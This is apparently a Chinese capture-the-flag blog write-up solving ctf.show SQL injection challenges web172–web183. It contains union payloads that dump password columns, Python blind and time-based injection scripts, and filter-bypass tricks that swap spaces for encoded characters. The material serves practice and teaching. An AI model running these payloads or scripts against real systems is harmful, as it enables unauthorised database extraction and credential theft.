
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,database()%23 //数据库名 比如这里为 ctfshow_web</span><br><span class="line">-1&#x27;union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;%23 //爆表名 //爆该数据库下的表名 </span><br><span class="line">-1&#x27;union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_user2&#x27;%23//爆表下面的字段名</span><br><span class="line">-1&#x27;union select 1,group_concat(password)from ctfshow_user2 //爆字段的值</span><br></pre></td></tr></table></figure>

<h4 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h4><p>做这个题刚开始犯错的地方：</p>
<p>1.可以用<code>group_concat</code>来连接，直接显示在一起。</p>
<p>2.爆字段名的时候，我把<code>column_name</code>写成了<code>column_table</code> </p>
<p>3.这个题目已经把sql语句给出了，表名也直接告诉我们了，就省略了库名和表名的获取，甚至字段名都告诉我们了，有username和password。</p>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p><code>1&#39;and 1%23</code> 和 <code>1&#39;and 0%23</code> 回显是不一样的，所以可以用布尔盲注。</p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line"><span class="comment">#url=&quot;http://68c27803-c8cb-44b9-b9f9-b88a8cb1dbea.challenge.ctf.show/api/v2.php?id=1&#x27;and if(substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,1,0)%23&quot;</span></span><br><span class="line">url=<span class="string">&quot;http://d575b8db-341f-4579-90c7-66f74d93bd7c.challenge.ctf.show/api/v2.php?id=1&#x27;and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,1,0)%23&quot;</span></span><br><span class="line">dicts=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789_=&quot;</span></span><br><span class="line">database=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dicts:</span><br><span class="line">        data=url.<span class="built_in">format</span>(i,j)</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        res=requests.get(data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            database+=j</span><br><span class="line">            <span class="built_in">print</span>(database)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(database)</span><br></pre></td></tr></table></figure>

<p>当然这里的很多地方都是可以改的。包括算法上面的优化(二分法)，后面的盲注题目那里会归纳一下。</p>
<h4 id="反思-1"><a href="#反思-1" class="headerlink" title="反思"></a>反思</h4><p>1.一开始用<code>requests.get(url)</code>的时候一直在报错，后面调了下才发现是<code>https:</code>的问题，改成<code>http</code> 就可以了。</p>
<p>2.传参点不好找，那就抓包去看一下，可以发现<code>/api/v2.php?id=xxx</code></p>
<h3 id="解法三"><a href="#解法三" class="headerlink" title="解法三"></a>解法三</h3><p>这里的解法三其实和解法一本质上是一样的，多的是一个编码的操作，看payload:</p>
<p><code>-1&#39; union select hex(username),hex(password)from ctfshow_user2--+</code></p>
<p><code>-1&#39; union select to_base64(username),to_base64(password)from ctfshow_user2--+</code></p>
<p>反思</p>
<p>这个题目其实不编码也能出，不过这种<strong>编码来绕过的</strong>思想应该去掌握。</p>
<h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>和web172差不多，回显位变成了三位。payload:<code>-1&#39;union select 1,2,group_concat(password)from ctfshow_user3--+</code></p>
<p>不赘述。</p>
<h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>一开始以为是和上面思路差不多，只是在返回的时候加了一些对flag的检查。但这里其实是没有回显到页面上的。<del>不能用联合注入，</del></p>
<p>错了，错了。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>检查结果是否有flag</span><br><span class="line">    if(<span class="operator">!</span>preg_match(<span class="string">&#x27;/flag|[0-9]/i&#x27;</span>, json_encode($ret)))&#123;</span><br><span class="line">      $ret[<span class="string">&#x27;msg&#x27;</span>]<span class="operator">=</span><span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个题目才是真正的对回显的数据整体做了过滤，<strong>之前那三道环境只是对username字段的返回值作了过滤</strong>。有点问题，导致以为过滤没用。。。这里就是回显的内容里面带有flag或者数字都不行，而很显然flag是带数字的。所以得想办法绕过。</p>
<h3 id="解法一-1"><a href="#解法一-1" class="headerlink" title="解法一"></a>解法一</h3><p>可以用盲注，因为盲注是不会回显到页面上的。所以直接一整个绕过了。但是这里如果直接用我在web172写的脚本，跑的会很慢。。。</p>
<p>所以用二分法。其实二分法就是一个板子。需要替换的是我们写的payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://c6903216-a242-458e-a9ba-b03057f7ea53.challenge.ctf.show/api/v4.php?id=1&#x27;and &quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&#x27;if(ascii(substr((select group_concat(password) from ctfshow_user4 ),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0) --+&#x27;</span></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>参考的y4大佬的板子，这里的payload我们根据实际情况去替换。过滤了哪些，找到<strong>等效</strong>的可以去替换的就可以绕过。比如这里的<code>ascii</code>可以换成<code>ord</code>，后面专门出一块来谈谈过滤。</p>
<h4 id="反思-2"><a href="#反思-2" class="headerlink" title="反思"></a>反思</h4><p>1.这里的payload也记得要加上<code>group_concat</code> 不然会报错。</p>
<p>2.这里后面我们知道flag是在第24行，我们可以把payload改成： <code>payload = f&#39;if(ascii(substr((select group_concat(password) from ctfshow_user4 limit 24,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) --+&#39;</code></p>
<h3 id="解法二-1"><a href="#解法二-1" class="headerlink" title="解法二"></a>解法二</h3><p>这个思路也是挺有意思，不是不让出现数字和flag吗，我们可以把数字替换成小写字母，这样回显页面上的数据就是正常的。</p>
<p>用到的一个函数为：<code>replace(strings,str1,str2)</code> : 把 strings中出现<code>str1</code>的地方替换成<code>str2</code> 。</p>
<p>demo:</p>
<p><code>-1&#39;union select &#39;a&#39;,replace(replace(replace(&#39;flag&#39;,&#39;a&#39;,&#39;b&#39;),&#39;f&#39;,&#39;a&#39;),&#39;g&#39;,&#39;m&#39;)--+</code></p>
<p>递归来看，把flag里面出现a的地方替换成b，然后再次基础上把f替换成a，依次类推…..</p>
<p>但现在有个问题，就是原来的flag里面也有可能本身就存在小写字母，这样你就无法区分这个小写字母是我们替换而来的还是本身就有的。这个时候可以用hex（）来转一下，mysql语句中，hex得到的字母都是大写的，这样就可以规避了。</p>
<p><code>-1&#39; union select &#39;a&#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password),0,&#39;b&#39;),1,&#39;c&#39;),2,&#39;d&#39;),3,&#39;e&#39;),4,&#39;h&#39;),5,&#39;i&#39;),6,&#39;j&#39;),7,&#39;m&#39;),8,&#39;n&#39;),9,&#39;o&#39;) from ctfshow_user4 where username=&#39;flag&#39;--+</code></p>
<p>得到：<code>jemhjjmejnjFmmmBedeieceieiebeeehdDejjienendDehjcenendDeoehjiendDjjebejedjiedeijeebeieneemD</code></p>
<p>然后逆过程，把对应的小写字母换成数字：<code>63746673686F777B32353135353033342D366538382D346138382D393465382D6630363265323563303538337D</code></p>
<p>然后丢到<code>cyberchef</code>里面16进制转一下字符：<code>ctfshow&#123;25155034-6e88-4a88-94e8-f062e25c0583&#125;</code></p>
<h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><h3 id="解法一-2"><a href="#解法一-2" class="headerlink" title="解法一"></a>解法一</h3><p>这个题目在上一个题目的基础上，对回显内容的判断更为严苛了：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(<span class="operator">!</span>preg_match(<span class="string">&#x27;/[\x00-\x7f]/i&#x27;</span>, json_encode($ret)))&#123;</span><br><span class="line">  $ret[<span class="string">&#x27;msg&#x27;</span>]<span class="operator">=</span><span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ascii表上的0-127都不能出现，基本上是过滤掉了所有可见字符。</p>
<p>所以我们会发现布尔盲注用不了了，因为<code>?id=1&#39;and 1--+</code> 以及<code>?id=1&#39;and 0 --+</code> 返回的结果是一样的。但是这里我们可以以时间来创造出一个条件来，根据响应的时间来做判断条件。</p>
<p>demo: <code>?id=1&#39;and if(substr(database(),1,1)=&#39;c&#39;,sleep(1),1)--+</code> </p>
<p>我们根据延时来判断条件是否满足。经过测试发现是可以的。</p>
<p>把web174二分法布尔盲注的脚本稍微改下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">url = <span class="string">&quot;http://0fc6f65a-8908-4fd3-8819-623c7eaaba3c.challenge.ctf.show/api/v5.php?id=1&#x27; and &quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&#x27;if(ascii(substr((select group_concat(password) from ctfshow_user5 where username=&quot;flag&quot;),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(1),1) --+&#x27;</span></span><br><span class="line">        t1=datetime.datetime.now()</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        t2=datetime.datetime.now()</span><br><span class="line">        <span class="keyword">if</span> (t2-t1).seconds &gt; <span class="number">0.5</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<h4 id="反思-3"><a href="#反思-3" class="headerlink" title="反思"></a>反思</h4><p>1.这里首先第一个是<code>(t2-t1).seconds</code> 这个写法需要注意。</p>
<p>2.然后就是payload里面要加<code>group_concat()</code> 不然会报错，导致跑不出来，</p>
<p>3.第三个，因为时间盲注比较消耗时间，加上password字段对应的值有很多，所以这里我加了<code>where username=&#39;admin&#39;</code> 来做筛选。</p>
<h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><h3 id="解法一-3"><a href="#解法一-3" class="headerlink" title="解法一"></a>解法一</h3><p>只是查询的时候对username&#x3D;”flag”的数据做了限制，但是没有对返回显示的数据做限制，所以我们可以直接用或的语句去连接，虽然where username!&#x3D;’flag’ 这个语句使得flag那一行没出来，但是 or  1 这个语句 ，把所有的数据都显示在页面上。</p>
<p><code>?id=-1&#39;or 1--+</code>  </p>
<h3 id="解法二-2"><a href="#解法二-2" class="headerlink" title="解法二"></a>解法二</h3><p>手动去fuzz下可以发现select、group_concat啥的被过滤了。<del>所以这里可以就不用select了，直接从password字段里面去读数据。</del></p>
<p>这里我搞错了，虽然对select做了过滤，但是没有很严格区分大小写过滤，所以可以大写<code>Select</code>过滤，而这个题目仅仅只是对select做了一个过滤，没有区分大小写，所以我们可以大写绕过去。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://db16cc73-7180-4824-9e2a-9cc890fe17ed.challenge.ctf.show/api/?id=1&#x27;and &quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&#x27;if(ascii(substr((Select group_concat(password) from ctfshow_user where username=&quot;flag&quot;),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0) --+&#x27;</span></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="built_in">print</span>(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<h4 id="反思-4"><a href="#反思-4" class="headerlink" title="反思"></a>反思</h4><p>1.绕过的时候，先考虑有没有可能关键字没有被完全过滤？比如后台逻辑是替换，我们可以双写去绕过。后台逻辑没有区分大小写，我们可以大小写绕过。然后这些都不行，再去考虑换别的关键词。而不是一上来我们就以为select完全用不了了。</p>
<p>2.直接加group_concat(password)，这种语法是错的，得带上select group_concat(password) from xxx ，完整的一个句子。</p>
<p>3.substr(<strong>(select xx)</strong>,1,1)，记住套括号，直接 substr(select database(),1,1)，这样是不太行的，得用个括号把select database套起来。</p>
<h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><h3 id="解法一-4"><a href="#解法一-4" class="headerlink" title="解法一"></a>解法一</h3><p>在上题<code>web176</code>基础上，把空格过滤了。但是万能密码可以直接注出来。</p>
<p>payload: <code>?id=1&#39;or(1)%23</code></p>
<h3 id="解法二-3"><a href="#解法二-3" class="headerlink" title="解法二"></a>解法二</h3><p>过滤了空格，我们可以用<code>/**/、()、</code>来平替。脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://1f8cf4dd-8308-41a9-85ab-60fc6b3036ba.challenge.ctf.show/api/?id=1&#x27;and/**/&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&#x27;if(ascii(substr((Select/**/group_concat(password)/**/from/**/ctfshow_user/**/where/**/username=&quot;flag&quot;),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)%23&#x27;</span></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="built_in">print</span>(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<h4 id="反思-5"><a href="#反思-5" class="headerlink" title="反思"></a>反思</h4><p>这个题目整体下来，一开始是知道过滤了空格，但是出了点问题导致没做出来。原因是因为我这里用的<code>()</code> 来绕过空格的，即<code>(select)database()</code>，其实这种用法是有点问题的，可能会有语法的报错。所以还是用的是<code>select/**/database()</code>，这种结构来bypass掉空格。</p>
<h3 id="解法三-1"><a href="#解法三-1" class="headerlink" title="解法三"></a>解法三</h3><p>union联合注入也是可以的奥。 </p>
<h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><h3 id="解法一-5"><a href="#解法一-5" class="headerlink" title="解法一"></a>解法一</h3><p>还是可以万能密码直接梭。<code>?id=1&#39;or(1)%23</code></p>
<h3 id="解法二-4"><a href="#解法二-4" class="headerlink" title="解法二"></a>解法二</h3><p>这个题目还是过滤掉了空格，在此基础上<code>/**/</code>也用不了了。所以这里用的是<code>%09</code> ，其实剩下的都是一样的套路了。</p>
<p>贴上脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://9eed38bd-0303-4c2a-9163-6e840ddf65bd.challenge.ctf.show/api/?id=1&#x27;and%09&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&#x27;if(ascii(substr((Select%09group_concat(password)%09from%09ctfshow_user%09where%09username=&quot;flag&quot;),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)%23&#x27;</span></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="built_in">print</span>(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<h3 id="解法三-2"><a href="#解法三-2" class="headerlink" title="解法三"></a>解法三</h3><p>依然可以用union联合注入：</p>
<p>payload:<code>?id=-1&#39;union%09select%091,2,3%23</code>，板子在这里，后面的就是根据这个去改。</p>
<h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><h3 id="解法一-6"><a href="#解法一-6" class="headerlink" title="解法一"></a>解法一</h3><p>依然可以万能密码直接梭：<code>?id=1&#39;(or)1%23</code></p>
<h3 id="解法二-5"><a href="#解法二-5" class="headerlink" title="解法二"></a>解法二</h3><p>过滤了空格，<code>/**/、%09、</code> 都用不了，但是可以尝试<code>%0a、%0b、%0c、%0d去绕过</code></p>
<p>这里经过测试，<code>%0c</code>是可以绕过的，剩下的脚本方法和上面是一样的。</p>
<h4 id="反思-6"><a href="#反思-6" class="headerlink" title="反思"></a>反思</h4><p>这里其实可以fuzz一下，想起最开始20年参加的那次国赛，当时有个题目，就是空格那里过不去，其实可以写个脚本去fuzz，根据回显来判断哪些是可以用的：</p>
<p>比如这里可以<code>?id=1&#39;and$X$1%23</code> ，这里的<code>$X$</code> 可以换成我们用来fuzz的字符。通过回显有admin。来判断是否成功。</p>
<h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h2><h3 id="解法一-7"><a href="#解法一-7" class="headerlink" title="解法一"></a>解法一</h3><p><code>#、%23</code> 用不了，这里可以用<code>--+</code>，不过这里的空格被过滤了，经过测试，发现<code>%0c</code>可以用。</p>
<p>payload: <code>?id=1&#39;||1--%0c</code></p>
<p>其他方式同上，就是换了个字符的问题。</p>
<h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h2><h3 id="解法一-8"><a href="#解法一-8" class="headerlink" title="解法一"></a>解法一</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>其实这里咋一看，啥都给过滤了，很多都用不了，但是，经过测试发现<code>%0c</code>还是可以代替空格来用的。</p>
<p>payload:<code>?id=1&#39;or(1)--%0c</code>，因为这里的<code>#和%23</code> 都被过滤了，所以用的 <code>--%0c</code></p>
<h3 id="解法二-6"><a href="#解法二-6" class="headerlink" title="解法二"></a>解法二</h3><p>这个解法建立在我们知道<code>username</code>为flag那一行对应的id字段的值是26的情况下：</p>
<p>payload:<code>?id=-1&#39;or(id=26)and&#39;1&#39;=&#39;1</code>  。 这种写法就是没有去使用注释符，用引号去闭合。当然这里是用（）来做隔开，起到空格的效果，也可以换成<code>?id=-1&#39;or%0cid=26%0cand&#39;1&#39;=&#39;1&#39;</code>。同时要注意前面为啥用的-1，因为后面有个limit 1。限制只能输出一行。</p>
<p>其实哪怕不知道id也没事，只要能判断出flag是在某个id下，我们可以简单写个脚本来遍历一下id:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line">url=<span class="string">&quot;http://ff6f89e7-0fa6-4da6-b589-312279425b2c.challenge.ctf.show/api/?id=-1&#x27;or(id=&#123;&#125;)and&#x27;1&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    res = requests.get(url.<span class="built_in">format</span>(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ctfshow&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>



<h3 id="解法三及其他"><a href="#解法三及其他" class="headerlink" title="解法三及其他"></a>解法三及其他</h3><p>payload:  -1’or<code>username</code>&#x3D;’flag’and’1   &#x2F;&#x2F;注意这里显示的问题，username这个字段是加了反引号的。注意一下这种用法。不加反引号其实也行。只不过用括号隔开：<code>-1&#39;or(username)=&#39;flag&#39;and&#39;1</code></p>
<p>payload:<code>?id=-1&#39;or(username)like(&#39;flag&#39;)and&#39;1</code>  注意这里的like是全部匹配上才行。并且flag要带上引号。</p>
<p>payload:<code>?id=-1&#39;or(username)regexp(&#39;fl&#39;)and&#39;1</code> regexp就不需要完全匹配。</p>
<h3 id="反思-7"><a href="#反思-7" class="headerlink" title="反思"></a>反思</h3><p>1.题目哪怕告诉我们一些字符串被过滤了，但我们仍然可以尝试一下，根据实际环境来判断是否真的被过滤。比如这里的<code>%0c</code>其实就还可以用。</p>
<p>2.注释符被过滤，<code># %23 --+ --%0c --%09 --%0a --%0b --%0d</code> 这些可以换着用，当然如果都被过滤了，其实可以考虑不用注释符呗，用引号去闭合。</p>
<h2 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h2><h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h2><p>旧题新做，产生了新的体会。</p>
<p>先说说思路：</p>
<p>查询语句：<code>$sql = &quot;select count(pass) from &quot;.$_POST[&#39;tableName&#39;].&quot;;&quot;;</code></p>
<p>WAF：<code>&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into</code> </p>
<p>回显结果：<code>$user_count = 0;</code></p>
<p>这里我们能利用的前提是知道flag是藏在pass字段里面的，并且flag的格式是ctfshow{}，在这个基础上我们来写利用</p>
<p>先看一个demo:<code>select count(pass) from ctfshow_user where pass regexp &#39;ctfshow&#39;</code>，是返回1的，前面的count(pass)代表字段数，后面跟个where代表符合该条件的字段数。为1，则代表pass字段中值以<code>ctfshow</code>开头的只有一个。</p>
